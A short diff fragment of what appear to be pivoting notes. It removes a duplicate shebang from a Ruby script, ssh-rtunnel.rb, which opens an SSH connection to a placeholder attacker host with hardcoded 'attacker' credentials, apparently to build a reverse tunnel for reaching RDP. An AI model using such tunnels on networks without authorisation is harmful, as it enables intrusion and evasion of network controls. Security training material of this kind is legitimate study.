@@ -73,7 +73,6 @@ rdesktop WebServer:3333
 **ssh-rtunnel.rb**
 ```
 #!/usr/bin/evn ruby
-#!/usr/bin/evn ruby
 require 'net/ssh'
 
 Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|
